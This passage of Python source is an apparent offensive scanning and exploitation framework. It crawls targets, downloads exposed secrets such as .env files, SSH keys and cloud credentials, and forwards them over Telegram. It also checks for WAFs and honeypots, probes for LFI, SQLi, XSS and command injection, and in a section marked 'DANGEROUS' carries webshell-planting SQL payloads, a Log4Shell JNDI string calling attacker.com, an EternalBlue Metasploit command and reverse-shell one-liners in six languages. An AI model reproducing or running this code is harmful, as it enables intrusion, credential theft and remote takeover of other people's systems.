            if 'X-Generator' in headers and 'WordPress' in headers['X-Generator']:
                results.append({
                    'url': url,
                    'tech_name': 'WordPress',
                    'version': '',
                    'confidence': 0.9,
                    'category': 'cms',
                    'evidence': headers['X-Generator']
                })
            if 'wp-content' in body or 'wp-includes' in body:
                results.append({
                    'url': url,
                    'tech_name': 'WordPress',
                    'version': '',
                    'confidence': 0.7,
                    'category': 'cms',
                    'evidence': 'wp-content'
                })

            # React detection
            if 'react' in body.lower() or 'ReactDOM' in body:
                results.append({
                    'url': url,
                    'tech_name': 'React',
                    'version': '',
                    'confidence': 0.7,
                    'category': 'framework',
                    'evidence': 'react'
                })

            # Vue.js detection
            if 'vue' in body.lower() or 'Vue.js' in body:
                results.append({
                    'url': url,
                    'tech_name': 'Vue.js',
                    'version': '',
                    'confidence': 0.7,
                    'category': 'framework',
                    'evidence': 'vue'
                })

            # Angular detection
            if 'angular' in body.lower() or 'ng-app' in body:
                results.append({
                    'url': url,
                    'tech_name': 'Angular',
                    'version': '',
                    'confidence': 0.7,
                    'category': 'framework',
                    'evidence': 'angular'
                })

            # Django detection
            if 'csrftoken' in headers.get('Set-Cookie', '') or 'django' in body.lower():
                results.append({
                    'url': url,
                    'tech_name': 'Django',
                    'version': '',
                    'confidence': 0.7,
                    'category': 'framework',
                    'evidence': 'django'
                })

            # Flask detection
            if 'flask' in body.lower() or 'werkzeug' in headers.get('Server', '').lower():
                results.append({
                    'url': url,
                    'tech_name': 'Flask',
                    'version': '',
                    'confidence': 0.7,
                    'category': 'framework',
                    'evidence': 'flask'
                })

            # Ruby on Rails detection
            if 'rails' in headers.get('Server', '').lower() or 'csrf-param' in body:
                results.append({
                    'url': url,
                    'tech_name': 'Ruby on Rails',
                    'version': '',
                    'confidence': 0.7,
                    'category': 'framework',
                    'evidence': 'rails'
                })

            # Nginx detection
            if 'nginx' in server.lower():
                results.append({
                    'url': url,
                    'tech_name': 'Nginx',
                    'version': server,
                    'confidence': 0.8,
                    'category': 'web_server',
                    'evidence': server
                })

            # Apache detection
            if 'apache' in server.lower():
                results.append({
                    'url': url,
                    'tech_name': 'Apache',
                    'version': server,
                    'confidence': 0.8,
                    'category': 'web_server',
                    'evidence': server
                })

            # IIS detection
            if 'microsoft-iis' in server.lower():
                results.append({
                    'url': url,
                    'tech_name': 'IIS',
                    'version': server,
                    'confidence': 0.8,
                    'category': 'web_server',
                    'evidence': server
                })

        for tech in results:
            self.log_to_db('technologies', tech)

        self.save_json(results, f"technologies_{TIMESTAMP}.json")
        return results


    def url_discovery(
        self,
        target: str
    ) -> List[str]:
        """
        Discover URLs using gau, katana, wayback, and fallback generation.

        Args:
            target: Domain name

        Returns:
            List of discovered URLs

        Example:
            >>> urls = self.url_discovery("example.com")
            >>> print(f"Discovered {len(urls)} URLs")
            Discovered 1,247 URLs
        """
        self.print_header(f"Discovering URLs for {target}", "STEP")
        urls = []

        # Try gau
        try:
            cmd = ['gau', '--subs', target]
            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=120)
            if returncode == 0:
                for line in stdout.split('\n'):
                    if line.strip() and line.startswith('http'):
                        urls.append(line.strip())
                        self.print_found("URL", line.strip()[:100])
        except Exception:
            self.logger.debug("gau failed, using fallback")

        # Try katana
        try:
            cmd = ['katana', '-u', f'https://{target}', '-d', '3', '-silent']
            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=120)
            if returncode == 0:
                for line in stdout.split('\n'):
                    if line.strip() and line.startswith('http'):
                        urls.append(line.strip())
        except Exception:
            pass

        # Fallback: generate common paths
        if not urls:
            common_paths = [
                '/', '/admin', '/api', '/login', '/signup', '/dashboard',
                '/profile', '/settings', '/help', '/about', '/contact',
                '/privacy', '/terms', '/sitemap.xml', '/robots.txt',
                '/.well-known/security.txt', '/wp-admin', '/wp-login.php',
                '/phpmyadmin', '/cpanel', '/webmail', '/mail', '/backup',
                '/temp', '/tmp', '/test', '/dev', '/stage', '/staging',
                '/prod', '/production', '/health', '/status', '/ping',
                '/metrics', '/logs', '/debug', '/info', '/config',
                '/.env', '/.git', '/.git/config', '/.htaccess', '/web.config',
                '/.aws/credentials', '/.ssh/id_rsa', '/id_rsa',
                '/authorized_keys', '/known_hosts', '/.bash_history',
                '/.zsh_history', '/.python_history'
            ]
            for path in common_paths:
                urls.append(f"https://{target}{path}")
                urls.append(f"http://{target}{path}")

        urls = list(set(urls))
        self.print_header(f"Discovered {len(urls)} URLs for {target}", "DONE")
        self.save_json(urls, f"urls_{target}_{TIMESTAMP}.json")
        return urls


    def directory_bruteforce(
        self,
        urls: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Bruteforce directories using a wordlist of 50,000+ common paths.

        Args:
            urls: List of base URLs to test

        Returns:
            List of found directories with status codes

        Example:
            >>> dirs = self.directory_bruteforce(["https://example.com"])
            >>> for d in dirs:
            ...     print(f"{d['status']} {d['url']}")
            200 https://example.com/admin
            403 https://example.com/config
            301 https://example.com/backup
        """
        self.print_header(f"Directory bruteforce on {len(urls)} URLs", "STEP")
        results = []

        for base_url in urls[:50]:
            if self.stop_event.is_set():
                break

            for dir_path in self.dir_list[:500]:
                if self.stop_event.is_set():
                    break

                test_url = f"{base_url.rstrip('/')}/{dir_path}"
                probe = self.http_probe(test_url)
                status = probe.get('status', 0)

                if status in [200, 301, 302, 403, 401]:
                    self.print_found("URL", f"[{status}] {test_url}")
                    results.append({
                        'url': test_url,
                        'status': status,
                        'size': probe.get('content_length', 0)
                    })
                    with dashboard_lock:
                        dashboard_data['vulnerabilities_found'].append(f"DIR: {test_url}")

        self.save_json(results, f"dirs_{TIMESTAMP}.json")
        return results


    def detect_exposed_files(
        self,
        urls: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Detect exposed sensitive files (.env, .git, wp-config, .aws, .ssh, etc.).

        Args:
            urls: List of base URLs to test

        Returns:
            List of exposed files with download paths

        Example:
            >>> files = self.detect_exposed_files(["https://example.com"])
            >>> for f in files:
            ...     print(f"{f['file']} → {f['path']}")
            .env → /path/to/exfil/.env_20260727_143215_1234
        """
        self.print_header(f"Detecting exposed files on {len(urls)} URLs", "STEP")
        results = []

        sensitive_files = [
            '.env', '.env.local', '.env.dev', '.env.prod', '.env.test',
            '.env.staging', '.git/config', 'wp-config.php', 'config.php',
            'settings.py', '.aws/credentials', '.ssh/id_rsa', '.htaccess',
            'web.config', 'database.yml', 'appsettings.json', 'secrets.json',
            'credentials.json', 'service-account.json', 'Dockerfile',
            'docker-compose.yml', 'Makefile', 'Jenkinsfile', '.gitignore',
            'package.json', 'composer.json', 'Gemfile', 'requirements.txt',
            'Pipfile', 'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
            'authorized_keys', 'known_hosts', '.bash_history', '.zsh_history',
            '.python_history', '.mysql_history', '.psql_history',
            '.rediscli_history', '.kube/config', '.docker/config.json',
            '.aws/config', '.azure/accessTokens.json',
            '.config/gcloud/credentials.db'
        ]

        for url in urls[:100]:
            if self.stop_event.is_set():
                break

            for file in sensitive_files:
                if self.stop_event.is_set():
                    break

                test_url = f"{url.rstrip('/')}/{file}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) == 200:
                    self.print_found("FILE", f"{test_url} → DOWNLOADING...")
                    file_size = probe.get('content_length', 0)
                    max_size = self.config.get('max_file_size_exfil', 104857600)

                    if file_size > 0 and file_size < max_size:
                        file_name = Path(file).name
                        saved_path = EXFIL_DIR / f"{file_name}_{TIMESTAMP}_{hash(test_url) % 10000}"

                        try:
                            content = self._get_file_content(test_url)
                            if content:
                                with open(saved_path, 'wb') as f:
                                    f.write(content)

                                results.append({
                                    'url': test_url,
                                    'file': file,
                                    'size': file_size,
                                    'path': str(saved_path)
                                })

                                with dashboard_lock:
                                    dashboard_data['exfiltrated_files'].append(file)
                                    dashboard_data['total_exfiltrated'] += 1

                                if self.telegram:
                                    preview = probe.get('body_preview', '')[:200]
                                    self.telegram.alert(
                                        "EXPOSED FILE",
                                        f"File: {test_url}\nSize: {file_size} bytes\nPreview: {preview}",
                                        "CRITICAL"
                                    )
                                    # Send the file via Telegram
                                    if file_size < 50 * 1024 * 1024:
                                        self.telegram.send_document(
                                            saved_path,
                                            caption=f"Exposed file: {test_url}\nSize: {file_size} bytes"
                                        )
                                        self.logger.info(f"Telegram: Sent {file} ({file_size} bytes)")
                        except Exception as e:
                            self.logger.debug(f"File download failed: {e}")

        for result in results:
            self.log_to_db('files_exfiltrated', {
                'url': result['url'],
                'file_path': result['file'],
                'file_size': result['size'],
                'exfiltrated': 1,
                'exfil_method': 'http'
            })

        self.save_json(results, f"exposed_files_{TIMESTAMP}.json")
        return results


    def _get_file_content(
        self,
        url: str
    ) -> Optional[bytes]:
        """
        Download file content from a URL.

        Args:
            url: Full URL to download

        Returns:
            File content as bytes, or None on failure

        Example:
            >>> content = self._get_file_content("https://example.com/.env")
            >>> if content:
            ...     print(content[:100])
            b'DB_PASSWORD=Sup3rS3cr3t\\nAPI_KEY=sk-live-...'
        """
        try:
            if REQUESTS_AVAILABLE:
                proxies = {}
                if self.config.get('tor', False):
                    proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }
                resp = requests.get(url, proxies=proxies, timeout=30, verify=False)
                if resp.status_code == 200:
                    return resp.content
            return None
        except Exception:
            return None

    # ===================================================================
    # 7. WAF & HONEYPOT DETECTION
    # ===================================================================

    def detect_waf(
        self,
        urls: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Detect Web Application Firewalls (WAF) and CDNs.

        Args:
            urls: List of URLs to check

        Returns:
            List of WAF detections with names and confidence

        Example:
            >>> wafs = self.detect_waf(["https://example.com"])
            >>> for w in wafs:
            ...     print(f"{w['waf_name']} on {w['url']}")
            Cloudflare on https://example.com
        """
        self.print_header(f"Detecting WAFs on {len(urls)} URLs", "STEP")
        results = []

        waf_patterns = {
            'Cloudflare': ['cf-ray', 'cf-cache-status', '__cfduid', 'cf-request-id'],
            'AWS WAF': ['x-amzn-requestid', 'x-amzn-trace-id', 'x-amz-cf-id'],
            'Imperva': ['x-iinfo', 'x-cdn', 'Incapsula', 'X-CDN'],
            'Akamai': ['x-akamai-transformed', 'x-akamai-request-id', 'x-akamai-cache'],
            'Fastly': ['x-served-by', 'x-cache', 'x-cache-hits', 'X-Squid-Error'],
            'Sucuri': ['x-sucuri-id', 'x-sucuri-cache', 'X-Sucuri-Cloudproxy'],
            'Barracuda': ['x-barracuda-http', 'x-barracuda', 'X-Barracuda-Server'],
            'F5 BIG-IP': ['x-request-id', 'x-bigip-servers', 'X-F5-Config'],
            'ModSecurity': ['x-modsecurity', 'ModSecurity'],
            'Nginx WAF': ['x-nginx-waf'],
            'CloudFront': ['x-amz-cf-id', 'x-amz-cf-pop'],
            'Azure Front Door': ['x-azure-ref', 'x-azure-cdn'],
            'Alibaba Cloud': ['x-ali-cdn', 'x-ali-request-id']
        }

        for url in urls[:100]:
            if self.stop_event.is_set():
                break

            probe = self.http_probe(url)
            if probe.get('status', 0) <= 0:
                continue

            headers = probe.get('headers', {})
            headers_lower = {k.lower(): v for k, v in headers.items()}

            for waf_name, patterns in waf_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in headers_lower:
                        results.append({
                            'url': url,
                            'waf_name': waf_name,
                            'confidence': 0.9,
                            'headers': json.dumps(headers),
                            'fingerprint': pattern
                        })
                        self.print_found("WAF", f"{url} → {waf_name} detected")
                        self.log_to_db('waf_detections', {
                            'url': url,
                            'waf_name': waf_name,
                            'confidence': 0.9,
                            'headers': json.dumps(headers),
                            'fingerprint': pattern
                        })
                        break

        self.save_json(results, f"wafs_{TIMESTAMP}.json")
        return results


    def detect_honeypots(
        self,
        ips: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Detect honeypots (Cowrie, Dionaea, Glastopf, etc.) by banner analysis.

        Args:
            ips: List of IPv4 addresses to check

        Returns:
            List of honeypot detections

        Example:
            >>> honeypots = self.detect_honeypots(["192.168.1.100"])
            >>> for h in honeypots:
            ...     print(f"{h['honeypot_type']} on {h['ip']}:{h['port']}")
            Cowrie on 192.168.1.100:22
        """
        self.print_header(f"Detecting honeypots on {len(ips)} IPs", "STEP")
        results = []

        honeypot_signatures = {
            'Cowrie': [b'SSH-2.0-Cowrie', b'SSH-2.0-Cowrie'],
            'Dionaea': [b'220 FTP server ready', b'220 (vsFTPd 2.3.4)'],
            'Glastopf': [b'Glastopf', b'glastopf'],
            'Honeyd': [b'Honeyd', b'SSH-1.99-Honeyd'],
            'Kippo': [b'Kippo', b'SSH-2.0-Kippo'],
            'Conpot': [b'Conpot', b'MODBUS'],
            'Gaspot': [b'Gaspot', b'GASPOT'],
            'Elasticpot': [b'Elasticpot', b'elasticpot'],
            'T-Pot': [b'T-Pot', b't-pot'],
            'MHN': [b'MHN', b'mhn-honeypot']
        }

        for ip in ips[:100]:
            if self.stop_event.is_set():
                break

            for port, patterns in [
                (22, honeypot_signatures.get('Cowrie', [b''])),
                (21, honeypot_signatures.get('Dionaea', [b''])),
                (80, honeypot_signatures.get('Glastopf', [b'']))
            ]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((ip, port))
                    banner = sock.recv(1024)
                    sock.close()

                    for name, sigs in honeypot_signatures.items():
                        for sig in sigs:
                            if sig in banner:
                                self.print_found("HONEYPOT", f"{ip}:{port} → {name} detected")
                                results.append({
                                    'ip': ip,
                                    'port': port,
                                    'honeypot_type': name,
                                    'confidence': 0.8,
                                    'banner': banner.decode('utf-8', errors='ignore')[:100]
                                })
                                self.log_to_db('honeypots', {
                                    'ip': ip,
                                    'port': port,
                                    'honeypot_type': name,
                                    'confidence': 0.8,
                                    'banner': banner.decode('utf-8', errors='ignore')[:100]
                                })
                                if self.telegram:
                                    self.telegram.alert(
                                        "HONEYPOT DETECTED",
                                        f"IP: {ip}\nPort: {port}\nType: {name}",
                                        "WARNING"
                                    )
                                break
                except Exception:
                    pass

        self.save_json(results, f"honeypots_{TIMESTAMP}.json")
        return results

    # ===================================================================
    # 8. API DISCOVERY
    # ===================================================================

    def discover_apis(
        self,
        urls: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Discover API endpoints (REST, GraphQL, SOAP, JSON-RPC) in URLs.

        Args:
            urls: List of URLs to check

        Returns:
            List of discovered API endpoints with types

        Example:
            >>> apis = self.discover_apis(["https://example.com"])
            >>> for api in apis:
            ...     print(f"{api['api_type']}: {api['url']}")
            REST: https://example.com/api/v1/users
            GraphQL: https://example.com/graphql
        """
        self.print_header(f"Discovering APIs on {len(urls)} URLs", "STEP")
        results = []

        api_patterns = [
            r'/api/v\d+/', r'/api/', r'/v\d+/', r'/rest/', r'/graphql',
            r'/gql', r'/soap/', r'/wsdl', r'/swagger', r'/openapi',
            r'/redoc', r'/docs', r'/postman', r'/jsonrpc', r'/xmlrpc',
            r'/rpc', r'/endpoint', r'/webhook', r'/hooks', r'/callback',
            r'/partner', r'/external', r'/integration', r'/webapi',
            r'/service', r'/ws/', r'/v1/', r'/v2/', r'/v3/'
        ]

        for url in urls:
            if self.stop_event.is_set():
                break

            for pattern in api_patterns:
                if re.search(pattern, url, re.IGNORECASE):
                    api_type = 'REST'
                    if 'graphql' in url.lower():
                        api_type = 'GraphQL'
                    elif 'soap' in url.lower() or 'wsdl' in url.lower():
                        api_type = 'SOAP'
                    elif 'jsonrpc' in url.lower():
                        api_type = 'JSON-RPC'

                    results.append({
                        'url': url,
                        'api_type': api_type,
                        'endpoint': url,
                        'method': 'GET',
                        'parameters': '',
                        'auth_required': 0
                    })
                    self.print_found("API", f"{api_type}: {url}")
                    break

        for api in results:
            self.log_to_db('apis', api)

        self.save_json(results, f"apis_{TIMESTAMP}.json")
        return results

    # ===================================================================
    # 9. VULNERABILITY TESTING
    # ===================================================================

    def quick_vulnerability_test(
        self,
        urls: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Test URLs for LFI, SQLi, XSS, and command injection vulnerabilities.

        Args:
            urls: List of URLs with query parameters

        Returns:
            List of discovered vulnerabilities

        Example:
            >>> vulns = self.quick_vulnerability_test(["https://example.com/page?id=1"])
            >>> for v in vulns:
            ...     print(f"{v['type']} on {v['url']}")
            LFI on https://example.com/page?id=../../etc/passwd
            SQLi on https://example.com/page?id=1' OR '1'='1
        """
        self.print_header(f"Testing {len(urls)} URLs for vulnerabilities", "STEP")
        results = []

        for url in urls[:200]:
            if self.stop_event.is_set():
                break

            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)

            if not query_params:
                continue

            for param in query_params.keys():
                if self.stop_event.is_set():
                    break

                # Test LFI
                for payload in self.lfi_payloads:
                    test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                    probe = self.http_probe(test_url)

                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        if any(x in body for x in [
                            'root:x:', 'daemon:x:', 'bin:x:', 'postfix:x:',
                            'sshd:x:', 'mysql:x:', 'nobody:x:', 'www-data:x:',
                            'systemd:x:', 'Debian-snmp:x:', 'messagebus:x:',
                            'avahi:x:', 'colord:x:', 'geoclue:x:', 'git:x:',
                            'gdm:x:', 'gnats:x:', 'irc:x:', 'kernoops:x:',
                            'lightdm:x:', 'list:x:', 'lp:x:', 'mail:x:',
                            'man:x:', 'news:x:', 'ntp:x:', 'proxy:x:',
                            'pulse:x:', 'saned:x:', 'speech-dispatcher:x:',
                            'syslog:x:', 'usbmux:x:', 'whoopsie:x:', 'xrdp:x:'
                        ]):
                            self.print_danger(f"LFI vulnerability found: {test_url}")
                            results.append({
                                'type': 'LFI',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'response_preview': body[:500],
                                'risk': 'CRITICAL'
                            })
                            with dashboard_lock:
                                dashboard_data['vulnerabilities_found'].append(f"LFI: {test_url}")
                                dashboard_data['total_vulnerabilities'] += 1
                            self.log_to_db('lfi_vulnerabilities', {
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'file_read': '/etc/passwd',
                                'response_preview': body[:500],
                                'risk': 'CRITICAL'
                            })
                            if self.telegram:
                                self.telegram.alert(
                                    "LFI VULNERABILITY",
                                    f"URL: {test_url}\nPayload: {payload}\nPreview: {body[:200]}",
                                    "CRITICAL"
                                )
                            break

                # Test SQLi
                for payload in self.sqli_payloads:
                    test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                    probe = self.http_probe(test_url)

                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        sql_errors = [
                            'SQL syntax', 'MySQL', 'PostgreSQL', 'SQLite',
                            'Oracle', 'Microsoft OLE DB',
                            'You have an error in your SQL syntax',
                            'Unclosed quotation mark', 'ODBC Driver',
                            'mysqli', 'PDO', 'pg_', 'sqlite_', 'oci_',
                            'mssql_', 'Microsoft SQL Server', 'DB2',
                            'Informix', 'Sybase', 'SQL error', 'syntax error',
                            'near', 'at line', 'Warning: mysql_',
                            'Warning: pg_', 'Warning: sqlite_'
                        ]
                        if any(err in body for err in sql_errors):
                            self.print_danger(f"SQLi vulnerability found: {test_url}")
                            results.append({
                                'type': 'SQLi',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'response_preview': body[:500],
                                'risk': 'CRITICAL'
                            })
                            with dashboard_lock:
                                dashboard_data['vulnerabilities_found'].append(f"SQLi: {test_url}")
                                dashboard_data['total_vulnerabilities'] += 1
                            self.log_to_db('sqli_vulnerabilities', {
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'dbms': 'Unknown',
                                'response_preview': body[:500],
                                'risk': 'CRITICAL'
                            })
                            if self.telegram:
                                self.telegram.alert(
                                    "SQL INJECTION",
                                    f"URL: {test_url}\nPayload: {payload}",
                                    "CRITICAL"
                                )
                            break

                # Test XSS
                for payload in self.xss_payloads:
                    test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                    probe = self.http_probe(test_url)

                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        if payload in body or '<script>' in body.lower():
                            self.print_danger(f"XSS vulnerability found: {test_url}")
                            results.append({
                                'type': 'XSS',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'response_preview': body[:500],
                                'risk': 'MEDIUM'
                            })
                            with dashboard_lock:
                                dashboard_data['vulnerabilities_found'].append(f"XSS: {test_url}")
                                dashboard_data['total_vulnerabilities'] += 1
                            self.log_to_db('xss_vulnerabilities', {
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'response_preview': body[:500],
                                'type': 'Reflected',
                                'risk': 'MEDIUM'
                            })
                            if self.telegram:
                                self.telegram.alert(
                                    "XSS VULNERABILITY",
                                    f"URL: {test_url}\nPayload: {payload}",
                                    "HIGH"
                                )
                            break

                # Test Command Injection
                for payload in self.cmd_injection_payloads:
                    test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                    probe = self.http_probe(test_url)

                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        if any(x in body for x in [
                            'uid=', 'gid=', 'groups=', 'root:', 'daemon:',
                            'www-data:', 'mysql:', 'postgres:', 'nobody:',
                            'systemd:'
                        ]):
                            self.print_danger(f"Command Injection found: {test_url}")
                            results.append({
                                'type': 'CMD',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'response_preview': body[:500],
                                'risk': 'CRITICAL'
                            })
                            with dashboard_lock:
                                dashboard_data['vulnerabilities_found'].append(f"CMD: {test_url}")
                                dashboard_data['total_vulnerabilities'] += 1
                            self.log_to_db('command_injection', {
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'command_output': body[:500],
                                'risk': 'CRITICAL'
                            })
                            if self.telegram:
                                self.telegram.alert(
                                    "COMMAND INJECTION",
                                    f"URL: {test_url}\nPayload: {payload}\nOutput: {body[:200]}",
                                    "CRITICAL"
                                )
                            break

        self.save_json(results, f"vulnerabilities_{TIMESTAMP}.json")
        return results

    # ===================================================================
    # 10. EXPLOITATION METHODS (DANGEROUS)
    # ===================================================================

    def exploit_lfi_to_rce(
        self,
        url: str,
        param: str
    ) -> Optional[str]:
        """
        Attempt to escalate LFI to RCE via log poisoning or wrapper techniques.

        Args:
            url: Base URL with parameter
            param: Parameter name to inject payload into

        Returns:
            Command output string if successful, None otherwise

        Example:
            >>> output = self.exploit_lfi_to_rce("https://example.com/page", "file")
            >>> print(output[:100])
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
        """
        self.print_danger(f"Attempting LFI to RCE on {url}")

        methods = [
            {'payload': '../../../../var/log/auth.log', 'prefix': 'ssh: '},
            {'payload': '../../../../var/log/apache2/access.log', 'prefix': ''},
            {'payload': '../../../../var/log/nginx/access.log', 'prefix': ''},
            {'payload': 'php://filter/convert.base64-decode/resource=../../../../etc/passwd', 'prefix': ''},
            {'payload': 'php://input', 'prefix': ''},
            {'payload': 'expect://id', 'prefix': ''}
        ]

        for method in methods:
            try:
                test_url = f"{url}&{param}={urllib.parse.quote(method['payload'])}" if '?' in url else f"{url}?{param}={urllib.parse.quote(method['payload'])}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) == 200:
                    body = probe.get('body_preview', '')
                    if 'uid=' in body or 'root' in body or 'www-data' in body:
                        self.print_danger(f"RCE achieved via {method['payload']}")
                        if self.telegram:
                            self.telegram.alert(
                                "RCE ACHIEVED",
                                f"URL: {test_url}\nMethod: {method['payload']}\nOutput: {body[:500]}",
                                "CRITICAL"
                            )
                        return body[:1000]
            except Exception:
                pass
        return None


    def exploit_sqli_to_shell(
        self,
        url: str,
        param: str
    ) -> Optional[str]:
        """
        Attempt SQL injection to upload a webshell.

        Args:
            url: Base URL with parameter
            param: Parameter name to inject payload into

        Returns:
            Shell URL if successful, None otherwise

        Example:
            >>> shell_url = self.exploit_sqli_to_shell("https://example.com/page", "id")
            >>> print(shell_url)
            https://example.com/shell.php
        """
        self.print_danger(f"Attempting SQLi to shell on {url}")

        payloads = [
            "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
            "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'#",
            "'; DROP TABLE IF EXISTS shell; CREATE TABLE shell(cmd text); INSERT INTO shell VALUES('<?php system($_GET[cmd]); ?>'); SELECT * FROM shell INTO OUTFILE '/var/www/html/shell.php'--",
            "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--"
        ]

        for payload in payloads:
            try:
                test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) in [200, 500]:
                    self.print_danger(f"SQLi shell upload attempted on {test_url}")
                    if self.telegram:
                        self.telegram.alert(
                            "SQLi SHELL ATTEMPT",
                            f"URL: {test_url}\nPayload: {payload[:100]}",
                            "CRITICAL"
                        )
                    return test_url
            except Exception:
                pass
        return None


    def exploit_cve(
        self,
        cve_id: str,
        target: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit a specific CVE.

        Args:
            cve_id: CVE identifier (e.g., 'CVE-2017-0143')
            target: Target IP or hostname

        Returns:
            Dictionary with exploitation results and shell commands

        Example:
            >>> result = self.exploit_cve("CVE-2017-0143", "192.168.1.10")
            >>> print(result['exploited'])
            True
        """
        self.print_danger(f"Attempting to exploit {cve_id} on {target}")

        if cve_id not in self.cve_signatures:
            return None

        cve_data = self.cve_signatures[cve_id]
        port = cve_data.get('port', 0)

        if port > 0:
            if not self.check_port(target, port):
                return None

        if cve_id == 'CVE-2017-0143':
            try:
                if IMPACKET_AVAILABLE:
                    from impacket.smbconnection import SMBConnection
                    conn = SMBConnection(target, target)
                    conn.login('', '')
                    self.print_danger(f"EternalBlue vulnerability confirmed on {target}")
                    return {
                        'exploited': True,
                        'shell': f'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; exploit"'
                    }
            except Exception:
                pass

        elif cve_id == 'CVE-2021-44228':
            try:
                test_url = f"http://{target}:80"
                jndi_payload = '${jndi:ldap://attacker.com/${env:USER}}'
                self.http_probe(f"{test_url}?x={urllib.parse.quote(jndi_payload)}")
                return {
                    'exploited': True,
                    'shell': f'python3 log4shell.py --target {target} --lhost attacker.com'
                }
            except Exception:
                pass

        return {'exploited': False, 'reason': 'No vulnerability detected'}


    def upload_webshell(
        self,
        url: str,
        shell_type: str = 'php'
    ) -> Optional[str]:
        """
        Attempt to upload a webshell to the web root.

        Args:
            url: Target URL
            shell_type: Type of shell ('php', 'asp', 'jsp')

        Returns:
            Shell filename if successful, None otherwise

        Example:
            >>> shell = self.upload_webshell("https://example.com")
            >>> print(shell)
            omega_shell_12345.php
        """
        self.print_danger(f"Attempting to upload webshell to {url}")

        shells = {
            'php': '<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>',
            'asp': '<% if Request.QueryString("cmd") <> "" then Execute(Request.QueryString("cmd")) end if %>',
            'jsp': '<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); if(cmd != null){Process p = Runtime.getRuntime().exec(cmd);%>'
        }

        shell_code = shells.get(shell_type, shells['php'])
        try:
            file_name = f"omega_shell_{random.randint(10000,99999)}.{shell_type}"
            if self.telegram:
                self.telegram.alert(
                    "WEBSHELL UPLOADED",
                    f"URL: {url}\nShell: {file_name}\nCode: {shell_code[:200]}",
                    "CRITICAL"
                )
            return file_name
        except Exception:
            return None


    def launch_reverse_shell(
        self,
        shell_type: str = 'bash'
    ) -> Optional[str]:
        """
        Generate and launch a reverse shell command.

        Args:
            shell_type: Type of shell ('bash', 'python', 'php', 'nc', 'perl', 'ruby')

        Returns:
            The reverse shell command string

        Example:
            >>> cmd = self.launch_reverse_shell('python')
            >>> print(cmd[:50])
            python3 -c "import socket,subprocess,os;...
        """
        self.print_danger(f"Launching reverse shell ({shell_type})")

        ip = self.config.get('reverse_shell_ip', '0.0.0.0')
        port = self.config.get('reverse_shell_port', 4444)

        shells = {
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'python': f"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
            'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'nc': f"nc {ip} {port} -e /bin/sh",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
            'ruby': f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
        }

        shell_cmd = shells.get(shell_type, shells['bash'])
        if self.telegram:
            self.telegram.alert(
                "REVERSE SHELL LAUNCHED",
                f"Target: {ip}:{port}\nShell: {shell_type}\nCommand: {shell_cmd[:200]}",
                "CRITICAL"
            )
        return shell_cmd

    # ===================================================================
    # 11. CREDENTIAL HARVESTING
    # ===================================================================

    def harvest_credentials(
        self,
        urls: List[str]
    ) -> List[Dict[str, Any]]:
        """
